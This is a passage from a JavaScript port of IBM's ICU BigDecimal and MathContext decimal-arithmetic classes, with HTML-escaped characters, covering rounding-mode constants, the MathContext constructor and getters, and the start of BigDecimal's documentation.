LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT OF THIRD PARTY RIGHTS. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR HOLDERS INCLUDED IN THIS NOTICE BE LIABLE FOR ANY CLAIM, OR ANY SPECIAL INDIRECT OR CONSEQUENTIAL DAMAGES, OR ANY DAMAGES WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.Except as contained in this notice, the name of a copyright holder shall not be used in advertising or otherwise to promote the sale, use or other dealings in this Software without prior written authorization of the copyright holder.*/(function () &#123;var MathContext = (function () &#123;/* Generated from 'MathContext.nrx' 8 Sep 2000 11:07:48 [v2.00] *//* Options: Binary Comments Crossref Format Java Logo Strictargs Strictcase Trace2 Verbose3 *///--package com.ibm.icu.math;/* ------------------------------------------------------------------ *//* MathContext -- Math context settings *//* ------------------------------------------------------------------ *//* Copyright IBM Corporation, 1997, 2000. All Rights Reserved. *//* *//* The MathContext object encapsulates the settings used by the *//* BigDecimal class; it could also be used by other arithmetics. *//* ------------------------------------------------------------------ *//* Notes: *//* *//* 1. The properties are checked for validity on construction, so *//* the BigDecimal class may assume that they are correct. *//* ------------------------------------------------------------------ *//* Author: Mike Cowlishaw *//* 1997.09.03 Initial version (edited from netrexx.lang.RexxSet) *//* 1997.09.12 Add lostDigits property *//* 1998.05.02 Make the class immutable and final; drop set methods *//* 1998.06.05 Add Round (rounding modes) property *//* 1998.06.25 Rename from DecimalContext; allow digits=0 *//* 1998.10.12 change to com.ibm.icu.math package *//* 1999.02.06 add javadoc comments *//* 1999.03.05 simplify; changes from discussion with J. Bloch *//* 1999.03.13 1.00 release to IBM Centre for Java Technology *//* 1999.07.10 1.04 flag serialization unused *//* 2000.01.01 1.06 copyright update *//* ------------------------------------------------------------------ *//* JavaScript conversion (c) 2003 STZ-IDA and PTV AG, Karlsruhe, Germany *//** * The &lt;code&gt;MathContext&lt;/code&gt; immutable class encapsulates the * settings understood by the operator methods of the &#123;@link BigDecimal&#125; * class (and potentially other classes). Operator methods are those * that effect an operation on a number or a pair of numbers. * &lt;p&gt; * The settings, which are not base-dependent, comprise: * &lt;ol&gt; * &lt;li&gt;&lt;code&gt;digits&lt;/code&gt;: * the number of digits (precision) to be used for an operation * &lt;li&gt;&lt;code&gt;form&lt;/code&gt;: * the form of any exponent that results from the operation * &lt;li&gt;&lt;code&gt;lostDigits&lt;/code&gt;: * whether checking for lost digits is enabled * &lt;li&gt;&lt;code&gt;roundingMode&lt;/code&gt;: * the algorithm to be used for rounding. * &lt;/ol&gt; * &lt;p&gt; * When provided, a &lt;code&gt;MathContext&lt;/code&gt; object supplies the * settings for an operation directly. * &lt;p&gt; * When &lt;code&gt;MathContext.DEFAULT&lt;/code&gt; is provided for a * &lt;code&gt;MathContext&lt;/code&gt; parameter then the default settings are used * (&lt;code&gt;9, SCIENTIFIC, false, ROUND_HALF_UP&lt;/code&gt;). * &lt;p&gt; * In the &lt;code&gt;BigDecimal&lt;/code&gt; class, all methods which accept a * &lt;code&gt;MathContext&lt;/code&gt; object defaults) also have a version of the * method which does not accept a MathContext parameter. These versions * carry out unlimited precision fixed point arithmetic (as though the * settings were (&lt;code&gt;0, PLAIN, false, ROUND_HALF_UP&lt;/code&gt;). * &lt;p&gt; * The instance variables are shared with default access (so they are * directly accessible to the &lt;code&gt;BigDecimal&lt;/code&gt; class), but must * never be changed. * &lt;p&gt; * The rounding mode constants have the same names and values as the * constants of the same name in &lt;code&gt;java.math.BigDecimal&lt;/code&gt;, to * maintain compatibility with earlier versions of * &lt;code&gt;BigDecimal&lt;/code&gt;. * * @see BigDecimal * @author Mike Cowlishaw * @stable ICU 2.0 *///--public final class MathContext implements java.io.Serializable&#123; //--private static final java.lang.String $0=\"MathContext.nrx\"; //-- methods MathContext.prototype.getDigits = getDigits; MathContext.prototype.getForm = getForm; MathContext.prototype.getLostDigits = getLostDigits; MathContext.prototype.getRoundingMode = getRoundingMode; MathContext.prototype.toString = toString; MathContext.prototype.isValidRound = isValidRound; /* ----- Properties ----- */ /* properties public constant */ /** * Plain (fixed point) notation, without any exponent. * Used as a setting to control the form of the result of a * &lt;code&gt;BigDecimal&lt;/code&gt; operation. * A zero result in plain form may have a decimal part of one or * more zeros. * * @see #ENGINEERING * @see #SCIENTIFIC * @stable ICU 2.0 */ //--public static final int PLAIN=0; // [no exponent] MathContext.PLAIN = MathContext.prototype.PLAIN = 0; // [no exponent] /** * Standard floating point notation (with scientific exponential * format, where there is one digit before any decimal point). * Used as a setting to control the form of the result of a * &lt;code&gt;BigDecimal&lt;/code&gt; operation. * A zero result in plain form may have a decimal part of one or * more zeros. * * @see #ENGINEERING * @see #PLAIN * @stable ICU 2.0 */ //--public static final int SCIENTIFIC=1; // 1 digit before . MathContext.SCIENTIFIC = MathContext.prototype.SCIENTIFIC = 1; // 1 digit before . /** * Standard floating point notation (with engineering exponential * format, where the power of ten is a multiple of 3). * Used as a setting to control the form of the result of a * &lt;code&gt;BigDecimal&lt;/code&gt; operation. * A zero result in plain form may have a decimal part of one or * more zeros. * * @see #PLAIN * @see #SCIENTIFIC * @stable ICU 2.0 */ //--public static final int ENGINEERING=2; // 1-3 digits before . MathContext.ENGINEERING = MathContext.prototype.ENGINEERING = 2; // 1-3 digits before . // The rounding modes match the original BigDecimal class values /** * Rounding mode to round to a more positive number. * Used as a setting to control the rounding mode used during a * &lt;code&gt;BigDecimal&lt;/code&gt; operation. * &lt;p&gt; * If any of the discarded digits are non-zero then the result * should be rounded towards the next more positive digit. * @stable ICU 2.0 */ //--public static final int ROUND_CEILING=2; MathContext.ROUND_CEILING = MathContext.prototype.ROUND_CEILING = 2; /** * Rounding mode to round towards zero. * Used as a setting to control the rounding mode used during a * &lt;code&gt;BigDecimal&lt;/code&gt; operation. * &lt;p&gt; * All discarded digits are ignored (truncated). The result is * neither incremented nor decremented. * @stable ICU 2.0 */ //--public static final int ROUND_DOWN=1; MathContext.ROUND_DOWN = MathContext.prototype.ROUND_DOWN = 1; /** * Rounding mode to round to a more negative number. * Used as a setting to control the rounding mode used during a * &lt;code&gt;BigDecimal&lt;/code&gt; operation. * &lt;p&gt; * If any of the discarded digits are non-zero then the result * should be rounded towards the next more negative digit. * @stable ICU 2.0 */ //--public static final int ROUND_FLOOR=3; MathContext.ROUND_FLOOR = MathContext.prototype.ROUND_FLOOR = 3; /** * Rounding mode to round to nearest neighbor, where an equidistant * value is rounded down. * Used as a setting to control the rounding mode used during a * &lt;code&gt;BigDecimal&lt;/code&gt; operation. * &lt;p&gt; * If the discarded digits represent greater than half (0.5 times) * the value of a one in the next position then the result should be * rounded up (away from zero). Otherwise the discarded digits are * ignored. * @stable ICU 2.0 */ //--public static final int ROUND_HALF_DOWN=5; MathContext.ROUND_HALF_DOWN = MathContext.prototype.ROUND_HALF_DOWN = 5; /** * Rounding mode to round to nearest neighbor, where an equidistant * value is rounded to the nearest even neighbor. * Used as a setting to control the rounding mode used during a * &lt;code&gt;BigDecimal&lt;/code&gt; operation. * &lt;p&gt; * If the discarded digits represent greater than half (0.5 times) * the value of a one in the next position then the result should be * rounded up (away from zero). If they represent less than half, * then the result should be rounded down. * &lt;p&gt; * Otherwise (they represent exactly half) the result is rounded * down if its rightmost digit is even, or rounded up if its * rightmost digit is odd (to make an even digit). * @stable ICU 2.0 */ //--public static final int ROUND_HALF_EVEN=6; MathContext.ROUND_HALF_EVEN = MathContext.prototype.ROUND_HALF_EVEN = 6; /** * Rounding mode to round to nearest neighbor, where an equidistant * value is rounded up. * Used as a setting to control the rounding mode used during a * &lt;code&gt;BigDecimal&lt;/code&gt; operation. * &lt;p&gt; * If the discarded digits represent greater than or equal to half * (0.5 times) the value of a one in the next position then the result * should be rounded up (away from zero). Otherwise the discarded * digits are ignored. * @stable ICU 2.0 */ //--public static final int ROUND_HALF_UP=4; MathContext.ROUND_HALF_UP = MathContext.prototype.ROUND_HALF_UP = 4; /** * Rounding mode to assert that no rounding is necessary. * Used as a setting to control the rounding mode used during a * &lt;code&gt;BigDecimal&lt;/code&gt; operation. * &lt;p&gt; * Rounding (potential loss of information) is not permitted. * If any of the discarded digits are non-zero then an * &lt;code&gt;ArithmeticException&lt;/code&gt; should be thrown. * @stable ICU 2.0 */ //--public static final int ROUND_UNNECESSARY=7; MathContext.ROUND_UNNECESSARY = MathContext.prototype.ROUND_UNNECESSARY = 7; /** * Rounding mode to round away from zero. * Used as a setting to control the rounding mode used during a * &lt;code&gt;BigDecimal&lt;/code&gt; operation. * &lt;p&gt; * If any of the discarded digits are non-zero then the result will * be rounded up (away from zero). * @stable ICU 2.0 */ //--public static final int ROUND_UP=0; MathContext.ROUND_UP = MathContext.prototype.ROUND_UP = 0; /* properties shared */ /** * The number of digits (precision) to be used for an operation. * A value of 0 indicates that unlimited precision (as many digits * as are required) will be used. * &lt;p&gt; * The &#123;@link BigDecimal&#125; operator methods use this value to * determine the precision of results. * Note that leading zeros (in the integer part of a number) are * never significant. * &lt;p&gt; * &lt;code&gt;digits&lt;/code&gt; will always be non-negative. * * @serial */ //--int digits; /** * The form of results from an operation. * &lt;p&gt; * The &#123;@link BigDecimal&#125; operator methods use this value to * determine the form of results, in particular whether and how * exponential notation should be used. * * @see #ENGINEERING * @see #PLAIN * @see #SCIENTIFIC * @serial */ //--int form; // values for this must fit in a byte /** * Controls whether lost digits checking is enabled for an * operation. * Set to &lt;code&gt;true&lt;/code&gt; to enable checking, or * to &lt;code&gt;false&lt;/code&gt; to disable checking. * &lt;p&gt; * When enabled, the &#123;@link BigDecimal&#125; operator methods check * the precision of their operand or operands, and throw an * &lt;code&gt;ArithmeticException&lt;/code&gt; if an operand is more precise * than the digits setting (that is, digits would be lost). * When disabled, operands are rounded to the specified digits. * * @serial */ //--boolean lostDigits; /** * The rounding algorithm to be used for an operation. * &lt;p&gt; * The &#123;@link BigDecimal&#125; operator methods use this value to * determine the algorithm to be used when non-zero digits have to * be discarded in order to reduce the precision of a result. * The value must be one of the public constants whose name starts * with &lt;code&gt;ROUND_&lt;/code&gt;. * * @see #ROUND_CEILING * @see #ROUND_DOWN * @see #ROUND_FLOOR * @see #ROUND_HALF_DOWN * @see #ROUND_HALF_EVEN * @see #ROUND_HALF_UP * @see #ROUND_UNNECESSARY * @see #ROUND_UP * @serial */ //--int roundingMode; /* properties private constant */ // default settings //--private static final int DEFAULT_FORM=SCIENTIFIC; //--private static final int DEFAULT_DIGITS=9; //--private static final boolean DEFAULT_LOSTDIGITS=false; //--private static final int DEFAULT_ROUNDINGMODE=ROUND_HALF_UP; MathContext.prototype.DEFAULT_FORM=MathContext.prototype.SCIENTIFIC; MathContext.prototype.DEFAULT_DIGITS=9; MathContext.prototype.DEFAULT_LOSTDIGITS=false; MathContext.prototype.DEFAULT_ROUNDINGMODE=MathContext.prototype.ROUND_HALF_UP; /* properties private constant */ //--private static final int MIN_DIGITS=0; // smallest value for DIGITS. //--private static final int MAX_DIGITS=999999999; // largest value for DIGITS. If increased, MathContext.prototype.MIN_DIGITS=0; // smallest value for DIGITS. MathContext.prototype.MAX_DIGITS=999999999; // largest value for DIGITS. If increased, // the BigDecimal class may need update. // list of valid rounding mode values, most common two first //--private static final int ROUNDS[]=new int[]&#123;ROUND_HALF_UP,ROUND_UNNECESSARY,ROUND_CEILING,ROUND_DOWN,ROUND_FLOOR,ROUND_HALF_DOWN,ROUND_HALF_EVEN,ROUND_UP&#125;; MathContext.prototype.ROUNDS=new Array(MathContext.prototype.ROUND_HALF_UP,MathContext.prototype.ROUND_UNNECESSARY,MathContext.prototype.ROUND_CEILING,MathContext.prototype.ROUND_DOWN,MathContext.prototype.ROUND_FLOOR,MathContext.prototype.ROUND_HALF_DOWN,MathContext.prototype.ROUND_HALF_EVEN,MathContext.prototype.ROUND_UP); //--private static final java.lang.String ROUNDWORDS[]=new java.lang.String[]&#123;\"ROUND_HALF_UP\",\"ROUND_UNNECESSARY\",\"ROUND_CEILING\",\"ROUND_DOWN\",\"ROUND_FLOOR\",\"ROUND_HALF_DOWN\",\"ROUND_HALF_EVEN\",\"ROUND_UP\"&#125;; // matching names of the ROUNDS values MathContext.prototype.ROUNDWORDS=new Array(\"ROUND_HALF_UP\",\"ROUND_UNNECESSARY\",\"ROUND_CEILING\",\"ROUND_DOWN\",\"ROUND_FLOOR\",\"ROUND_HALF_DOWN\",\"ROUND_HALF_EVEN\",\"ROUND_UP\"); // matching names of the ROUNDS values /* properties private constant unused */ // Serialization version //--private static final long serialVersionUID=7163376998892515376L; /* properties public constant */ /** * A &lt;code&gt;MathContext&lt;/code&gt; object initialized to the default * settings for general-purpose arithmetic. That is, * &lt;code&gt;digits=9 form=SCIENTIFIC lostDigits=false * roundingMode=ROUND_HALF_UP&lt;/code&gt;. * * @see #SCIENTIFIC * @see #ROUND_HALF_UP * @stable ICU 2.0 */ //--public static final com.ibm.icu.math.MathContext DEFAULT=new com.ibm.icu.math.MathContext(DEFAULT_DIGITS,DEFAULT_FORM,DEFAULT_LOSTDIGITS,DEFAULT_ROUNDINGMODE); MathContext.prototype.DEFAULT=new MathContext(MathContext.prototype.DEFAULT_DIGITS,MathContext.prototype.DEFAULT_FORM,MathContext.prototype.DEFAULT_LOSTDIGITS,MathContext.prototype.DEFAULT_ROUNDINGMODE); /* ----- Constructors ----- */ /** * Constructs a new &lt;code&gt;MathContext&lt;/code&gt; with a specified * precision. * The other settings are set to the default values * (see &#123;@link #DEFAULT&#125;). * * An &lt;code&gt;IllegalArgumentException&lt;/code&gt; is thrown if the * &lt;code&gt;setdigits&lt;/code&gt; parameter is out of range * (&lt;0 or &gt;999999999). * * @param setdigits The &lt;code&gt;int&lt;/code&gt; digits setting * for this &lt;code&gt;MathContext&lt;/code&gt;. * @throws IllegalArgumentException parameter out of range. * @stable ICU 2.0 */ //--public MathContext(int setdigits)&#123; //-- this(setdigits,DEFAULT_FORM,DEFAULT_LOSTDIGITS,DEFAULT_ROUNDINGMODE); //-- return;&#125; /** * Constructs a new &lt;code&gt;MathContext&lt;/code&gt; with a specified * precision and form. * The other settings are set to the default values * (see &#123;@link #DEFAULT&#125;). * * An &lt;code&gt;IllegalArgumentException&lt;/code&gt; is thrown if the * &lt;code&gt;setdigits&lt;/code&gt; parameter is out of range * (&lt;0 or &gt;999999999), or if the value given for the * &lt;code&gt;setform&lt;/code&gt; parameter is not one of the appropriate * constants. * * @param setdigits The &lt;code&gt;int&lt;/code&gt; digits setting * for this &lt;code&gt;MathContext&lt;/code&gt;. * @param setform The &lt;code&gt;int&lt;/code&gt; form setting * for this &lt;code&gt;MathContext&lt;/code&gt;. * @throws IllegalArgumentException parameter out of range. * @stable ICU 2.0 */ //--public MathContext(int setdigits,int setform)&#123; //-- this(setdigits,setform,DEFAULT_LOSTDIGITS,DEFAULT_ROUNDINGMODE); //-- return;&#125; /** * Constructs a new &lt;code&gt;MathContext&lt;/code&gt; with a specified * precision, form, and lostDigits setting. * The roundingMode setting is set to its default value * (see &#123;@link #DEFAULT&#125;). * * An &lt;code&gt;IllegalArgumentException&lt;/code&gt; is thrown if the * &lt;code&gt;setdigits&lt;/code&gt; parameter is out of range * (&lt;0 or &gt;999999999), or if the value given for the * &lt;code&gt;setform&lt;/code&gt; parameter is not one of the appropriate * constants. * * @param setdigits The &lt;code&gt;int&lt;/code&gt; digits setting * for this &lt;code&gt;MathContext&lt;/code&gt;. * @param setform The &lt;code&gt;int&lt;/code&gt; form setting * for this &lt;code&gt;MathContext&lt;/code&gt;. * @param setlostdigits The &lt;code&gt;boolean&lt;/code&gt; lostDigits * setting for this &lt;code&gt;MathContext&lt;/code&gt;. * @throws IllegalArgumentException parameter out of range. * @stable ICU 2.0 */ //--public MathContext(int setdigits,int setform,boolean setlostdigits)&#123; //-- this(setdigits,setform,setlostdigits,DEFAULT_ROUNDINGMODE); //-- return;&#125; /** * Constructs a new &lt;code&gt;MathContext&lt;/code&gt; with a specified * precision, form, lostDigits, and roundingMode setting. * * An &lt;code&gt;IllegalArgumentException&lt;/code&gt; is thrown if the * &lt;code&gt;setdigits&lt;/code&gt; parameter is out of range * (&lt;0 or &gt;999999999), or if the value given for the * &lt;code&gt;setform&lt;/code&gt; or &lt;code&gt;setroundingmode&lt;/code&gt; parameters is * not one of the appropriate constants. * * @param setdigits The &lt;code&gt;int&lt;/code&gt; digits setting * for this &lt;code&gt;MathContext&lt;/code&gt;. * @param setform The &lt;code&gt;int&lt;/code&gt; form setting * for this &lt;code&gt;MathContext&lt;/code&gt;. * @param setlostdigits The &lt;code&gt;boolean&lt;/code&gt; lostDigits * setting for this &lt;code&gt;MathContext&lt;/code&gt;. * @param setroundingmode The &lt;code&gt;int&lt;/code&gt; roundingMode setting * for this &lt;code&gt;MathContext&lt;/code&gt;. * @throws IllegalArgumentException parameter out of range. * @stable ICU 2.0 */ //--public MathContext(int setdigits,int setform,boolean setlostdigits,int setroundingmode)&#123;super(); function MathContext() &#123; //-- members this.digits = 0; this.form = 0; // values for this must fit in a byte this.lostDigits = false; this.roundingMode = 0; //-- overloaded ctor var setform = this.DEFAULT_FORM; var setlostdigits = this.DEFAULT_LOSTDIGITS; var setroundingmode = this.DEFAULT_ROUNDINGMODE; if (MathContext.arguments.length == 4) &#123; setform = MathContext.arguments[1]; setlostdigits = MathContext.arguments[2]; setroundingmode = MathContext.arguments[3]; &#125; else if (MathContext.arguments.length == 3) &#123; setform = MathContext.arguments[1]; setlostdigits = MathContext.arguments[2]; &#125; else if (MathContext.arguments.length == 2) &#123; setform = MathContext.arguments[1]; &#125; else if (MathContext.arguments.length != 1) &#123; throw \"MathContext(): \" + MathContext.arguments.length + \" arguments given; expected 1 to 4\"; &#125; var setdigits = MathContext.arguments[0]; // set values, after checking if (setdigits!=this.DEFAULT_DIGITS) &#123; if (setdigits&lt;this.MIN_DIGITS) throw \"MathContext(): Digits too small: \"+setdigits; if (setdigits&gt;this.MAX_DIGITS) throw \"MathContext(): Digits too large: \"+setdigits; &#125; &#123;/*select*/ if (setform==this.SCIENTIFIC) &#123;&#125; // [most common] else if (setform==this.ENGINEERING) &#123;&#125; else if (setform==this.PLAIN) &#123;&#125; else&#123; throw \"MathContext() Bad form value: \"+setform; &#125; &#125; if ((!(this.isValidRound(setroundingmode)))) throw \"MathContext(): Bad roundingMode value: \"+setroundingmode; this.digits=setdigits; this.form=setform; this.lostDigits=setlostdigits; // [no bad value possible] this.roundingMode=setroundingmode; return;&#125; /** * Returns the digits setting. * This value is always non-negative. * * @return an &lt;code&gt;int&lt;/code&gt; which is the value of the digits * setting * @stable ICU 2.0 */ //--public int getDigits()&#123; function getDigits() &#123; return this.digits; &#125; /** * Returns the form setting. * This will be one of * &#123;@link #ENGINEERING&#125;, * &#123;@link #PLAIN&#125;, or * &#123;@link #SCIENTIFIC&#125;. * * @return an &lt;code&gt;int&lt;/code&gt; which is the value of the form setting * @stable ICU 2.0 */ //--public int getForm()&#123; function getForm() &#123; return this.form; &#125; /** * Returns the lostDigits setting. * This will be either &lt;code&gt;true&lt;/code&gt; (enabled) or * &lt;code&gt;false&lt;/code&gt; (disabled). * * @return a &lt;code&gt;boolean&lt;/code&gt; which is the value of the lostDigits * setting * @stable ICU 2.0 */ //--public boolean getLostDigits()&#123; function getLostDigits() &#123; return this.lostDigits; &#125; /** * Returns the roundingMode setting. * This will be one of * &#123;@link #ROUND_CEILING&#125;, * &#123;@link #ROUND_DOWN&#125;, * &#123;@link #ROUND_FLOOR&#125;, * &#123;@link #ROUND_HALF_DOWN&#125;, * &#123;@link #ROUND_HALF_EVEN&#125;, * &#123;@link #ROUND_HALF_UP&#125;, * &#123;@link #ROUND_UNNECESSARY&#125;, or * &#123;@link #ROUND_UP&#125;. * * @return an &lt;code&gt;int&lt;/code&gt; which is the value of the roundingMode * setting * @stable ICU 2.0 */ //--public int getRoundingMode()&#123; function getRoundingMode() &#123; return this.roundingMode; &#125; /** Returns the &lt;code&gt;MathContext&lt;/code&gt; as a readable string. * The &lt;code&gt;String&lt;/code&gt; returned represents the settings of the * &lt;code&gt;MathContext&lt;/code&gt; object as four blank-delimited words * separated by a single blank and with no leading or trailing blanks, * as follows: * &lt;ol&gt; * &lt;li&gt; * &lt;code&gt;digits=&lt;/code&gt;, immediately followed by * the value of the digits setting as a numeric word. * &lt;li&gt; * &lt;code&gt;form=&lt;/code&gt;, immediately followed by * the value of the form setting as an uppercase word * (one of &lt;code&gt;SCIENTIFIC&lt;/code&gt;, &lt;code&gt;PLAIN&lt;/code&gt;, or * &lt;code&gt;ENGINEERING&lt;/code&gt;). * &lt;li&gt; * &lt;code&gt;lostDigits=&lt;/code&gt;, immediately followed by * the value of the lostDigits setting * (&lt;code&gt;1&lt;/code&gt; if enabled, &lt;code&gt;0&lt;/code&gt; if disabled). * &lt;li&gt; * &lt;code&gt;roundingMode=&lt;/code&gt;, immediately followed by * the value of the roundingMode setting as a word. * This word will be the same as the name of the corresponding public * constant. * &lt;/ol&gt; * &lt;p&gt; * For example: * &lt;br&gt;&lt;code&gt; * digits=9 form=SCIENTIFIC lostDigits=0 roundingMode=ROUND_HALF_UP * &lt;/code&gt; * &lt;p&gt; * Additional words may be appended to the result of * &lt;code&gt;toString&lt;/code&gt; in the future if more properties are added * to the class. * * @return a &lt;code&gt;String&lt;/code&gt; representing the context settings. * @stable ICU 2.0 */ //--public java.lang.String toString()&#123; function toString() &#123; //--java.lang.String formstr=null; var formstr=null; //--int r=0; var r=0; //--java.lang.String roundword=null; var roundword=null; &#123;/*select*/ if (this.form==this.SCIENTIFIC) formstr=\"SCIENTIFIC\"; else if (this.form==this.ENGINEERING) formstr=\"ENGINEERING\"; else&#123; formstr=\"PLAIN\";/* form=PLAIN */ &#125; &#125; &#123;var $1=this.ROUNDS.length;r=0;r:for(;$1&gt;0;$1--,r++)&#123; if (this.roundingMode==this.ROUNDS[r]) &#123; roundword=this.ROUNDWORDS[r]; break r; &#125; &#125; &#125;/*r*/ return \"digits=\"+this.digits+\" \"+\"form=\"+formstr+\" \"+\"lostDigits=\"+(this.lostDigits?\"1\":\"0\")+\" \"+\"roundingMode=\"+roundword; &#125; /* &lt;sgml&gt; Test whether round is valid. &lt;/sgml&gt; */ // This could be made shared for use by BigDecimal for setScale. //--private static boolean isValidRound(int testround)&#123; function isValidRound(testround) &#123; //--int r=0; var r=0; &#123;var $2=this.ROUNDS.length;r=0;r:for(;$2&gt;0;$2--,r++)&#123; if (testround==this.ROUNDS[r]) return true; &#125; &#125;/*r*/ return false; &#125;return MathContext;&#125;)();var BigDecimal = (function (MathContext) &#123;/* Generated from 'BigDecimal.nrx' 8 Sep 2000 11:10:50 [v2.00] *//* Options: Binary Comments Crossref Format Java Logo Strictargs Strictcase Trace2 Verbose3 *///--package com.ibm.icu.math;//--import java.math.BigInteger;//--import com.ibm.icu.impl.Utility;/* ------------------------------------------------------------------ *//* BigDecimal -- Decimal arithmetic for Java *//* ------------------------------------------------------------------ *//* Copyright IBM Corporation, 1996, 2000. All Rights Reserved. *//* *//* The BigDecimal class provides immutable arbitrary-precision *//* floating point (including integer) decimal numbers. *//* *//* As the numbers are decimal, there is an exact correspondence *//* between an instance of a BigDecimal object and its String *//* representation; the BigDecimal class provides direct conversions *//* to and from String and character array objects, and well as *//* conversions to and from the Java primitive types (which may not *//* be exact). *//* ------------------------------------------------------------------ *//* Notes: *//* *//* 1. A BigDecimal object is never changed in value once constructed; *//* this avoids the need for locking. Note in particular that the *//* mantissa array may be shared between many BigDecimal objects, *//* so that once exposed it must not be altered. *//* *//* 2. This class looks at MathContext class fields directly (for *//* performance). It must not and does not change them. *//* *//* 3. Exponent checking is delayed until finish(), as we know *//* intermediate calculations cannot cause 31-bit overflow. *//* [This assertion depends on MAX_DIGITS in MathContext.] *//* *//* 4. Comments for the public API now follow the javadoc conventions. *//* The NetRexx -comments option is used to pass these comments *//* through to the generated Java code (with -format, if desired). *//* *//* 5. System.arraycopy is faster than explicit loop as follows *//* Mean length 4: equal *//* Mean length 8: x2 *//* Mean length 16: x3 *//* Mean length 24: x4 *//* From prior experience, we expect mean length a little below 8, *//* but arraycopy is still the one to use, in general, until later *//* measurements suggest otherwise. *//* *//* 6. 'DMSRCN' referred to below is the original (1981) IBM S/370 *//* assembler code implementation of the algorithms below; it is *//* now called IXXRCN and is available with the OS/390 and VM/ESA *//* operating systems. *//* ------------------------------------------------------------------ *//* Change History: *//* 1997.09.02 Initial version (derived from netrexx.lang classes) *//* 1997.09.12 Add lostDigits checking *//* 1997.10.06 Change mantissa to a byte array *//* 1997.11.22 Rework power [did not prepare arguments, etc.] *//* 1997.12.13 multiply did not prepare arguments *//* 1997.12.14 add did not prepare and align arguments correctly *//* 1998.05.02 0.07 packaging changes suggested by Sun and Oracle *//* 1998.05.21 adjust remainder operator finalization *//* 1998.06.04 rework to pass MathContext to finish() and round() *//* 1998.06.06 change format to use round(); support rounding modes *//* 1998.06.25 rename to BigDecimal and begin merge *//* zero can now have trailing zeros (i.e., exp\\=0) *//* 1998.06.28 new methods: movePointXxxx, scale, toBigInteger *//* unscaledValue, valueof *//* 1998.07.01 improve byteaddsub to allow array reuse, etc. *//* 1998.07.01 make null testing explicit to avoid JIT bug [Win32] *//* 1998.07.07 scaled division [divide(BigDecimal, int, int)] *//* 1998.07.08 setScale, faster equals *//* 1998.07.11 allow 1E6 (no sign) &lt;sigh&gt;; new double/float conversion *//* 1998.10.12 change package to com.ibm.icu.math *//* 1998.12.14 power operator no longer rounds RHS [to match ANSI] *//* add toBigDecimal() and BigDecimal(java.math.BigDecimal) *//* 1998.12.29 improve byteaddsub by using table lookup *//* 1999.02.04 lostdigits=0 behaviour rounds instead of digits+1 guard *//* 1999.02.05 cleaner code for BigDecimal(char[]) *//* 1999.02.06 add javadoc comments *//* 1999.02.11 format() changed from 7 to 2 method form *//* 1999.03.05 null pointer checking is no longer explicit *//* 1999.03.05 simplify; changes from discussion with J. Bloch: *//* null no longer permitted for MathContext; drop boolean, *//* byte, char, float, short constructor, deprecate double *//* constructor, no blanks in string constructor, add *//* offset and length version of char[] constructor; *//* add valueOf(double); drop booleanValue, charValue; *//* add ...Exact versions of remaining convertors *//* 1999.03.13 add toBigIntegerExact *//* 1999.03.13 1.00 release to IBM Centre for Java Technology *//* 1999.05.27 1.01 correct 0-0.2 bug under scaled arithmetic *//* 1999.06.29 1.02 constructors should not allow exponent &gt; 9 digits *//* 1999.07.03 1.03 lost digits should not be checked if digits=0 *//* 1999.07.06 lost digits Exception message changed *//* 1999.07.10 1.04 more work on 0-0.2 (scaled arithmetic) *//* 1999.07.17 improve messages from pow method *//* 1999.08.08 performance tweaks *//* 1999.08.15 fastpath in multiply *//* 1999.11.05 1.05 fix problem in intValueExact [e.g., 5555555555] *//* 1999.12.22 1.06 remove multiply fastpath, and improve performance *//* 2000.01.01 copyright update [Y2K has arrived] *//* 2000.06.18 1.08 no longer deprecate BigDecimal(double) *//* ------------------------------------------------------------------ *//* JavaScript conversion (c) 2003 STZ-IDA and PTV AG, Karlsruhe, Germany */function div(a, b) &#123; return (a-(a%b))/b;&#125;BigDecimal.prototype.div = div;function arraycopy(src, srcindex, dest, destindex, length) &#123; var i; if (destindex &gt; srcindex) &#123; // in case src and dest are equals, but also doesn't hurt // if they are different for (i = length-1; i &gt;= 0; --i) &#123; dest[i+destindex] = src[i+srcindex]; &#125; &#125; else &#123; for (i = 0; i &lt; length; ++i) &#123; dest[i+destindex] = src[i+srcindex]; &#125; &#125;&#125;BigDecimal.prototype.arraycopy = arraycopy;function createArrayWithZeros(length) &#123; var retVal = new Array(length); var i; for (i = 0; i &lt; length; ++i) &#123; retVal[i] = 0; &#125; return retVal;&#125;BigDecimal.prototype.createArrayWithZeros = createArrayWithZeros;/** * The &lt;code&gt;BigDecimal&lt;/code&gt; class implements immutable * arbitrary-precision decimal numbers. The methods of the * &lt;code&gt;BigDecimal&lt;/code&gt; class provide operations for fixed and * floating point arithmetic, comparison, format conversions, and * hashing. * &lt;p&gt; * As the numbers are decimal, there is an exact correspondence between * an instance of a &lt;code&gt;BigDecimal&lt;/code&gt; object and its * &lt;code&gt;String&lt;/code&gt; representation; the &lt;code&gt;BigDecimal&lt;/code&gt; class * provides direct conversions to and from &lt;code&gt;String&lt;/code&gt; and * character array (&lt;code&gt;char[]&lt;/code&gt;) objects, as well as conversions * to and from the Java primitive types (which may not be exact) and * &lt;code&gt;BigInteger&lt;/code&gt;. * &lt;p&gt; * In the descriptions of constructors and methods in this documentation, * the value of a &lt;code&gt;BigDecimal&lt;/code&gt; number object is shown as the * result of invoking the &lt;code&gt;toString()&lt;/code&gt; method on the object. * The internal representation of a decimal number is neither defined * nor exposed, and is not permitted to affect the result of any * operation. * &lt;p&gt; * The floating point arithmetic provided by this class is defined by * the ANSI X3.274-1996 standard, and is also documented at * &lt;code&gt;http://www2.hursley.ibm.com/decimal&lt;/code&gt; * &lt;br&gt;&lt;i&gt;[This URL will change.]&lt;/i&gt; * * &lt;h3&gt;Operator methods&lt;/h3&gt; * &lt;p&gt; * Operations on &lt;code&gt;BigDecimal&lt;/code&gt; numbers are controlled by a * &#123;@link MathContext&#125; object, which provides the context (precision and * other information) for the operation. Methods that can take a * &lt;code&gt;MathContext&lt;/code&gt; parameter implement the standard arithmetic * operators for &lt;code&gt;BigDecimal&lt;/code&gt; objects and are known as * &lt;i&gt;operator methods&lt;/i&gt;. The default settings provided by the * constant &#123;@link MathContext#DEFAULT&#125; (&lt;code&gt;digits=9, * form=SCIENTIFIC, 